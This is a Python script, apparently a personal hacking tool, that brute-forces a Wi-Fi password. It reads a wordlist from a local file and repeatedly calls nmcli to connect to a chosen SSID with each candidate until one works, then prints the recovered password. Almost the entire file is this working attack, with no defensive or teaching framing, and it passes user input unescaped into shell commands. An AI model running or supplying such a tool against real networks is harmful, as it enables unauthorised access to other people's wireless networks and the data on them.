#!/usr/bin/python3


# //////////// need to implement CLI VERSION //////////////


import sys
import os
import time

flag = False

os.system("nmcli device wifi")

print("___ Enter the SSID ___ \n")
ssid = input("SSID:")

print("Please enter your sudo password :")
os.system("sudo systemctl isolate multi-user.target")

def pas():
	os.chdir('/home/alex/Documents/Hacking')
	with open ("passwords.txt","r") as f :
		for line in f:
		    yield line.strip()

banner = """




_____BRUTEFORCER STARTING_____



\n """ 
								
for i in banner:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
    
time.sleep(0.02)
								
pswd_lst = pas()

count = 0
for pswd in pswd_lst:

    if len(pswd) < 8:
        continue
    
        
    if count == 10:
        os.system("sudo systemctl isolate graphical.target")
    
    count += 1
    
    try:
	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
	    print("trying : " + pswd)
	    
	    result = os.system(cmd)
	    time.sleep(2)
	    
	    if (result == 0):
	        print(f"Password Obtained {pswd}")
	        os.system("sudo systemctl isolate graphical.target")
	        break
	        
	    else: 
	        print(f"-- Incorrect password {pswd}")
	        
    except OSError:
        print("+++ == AN ERROR OCCURED == +++")
        break

end_msg = " ___ BRUTEFORCE completed ___ "

for i in end_msg:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
    















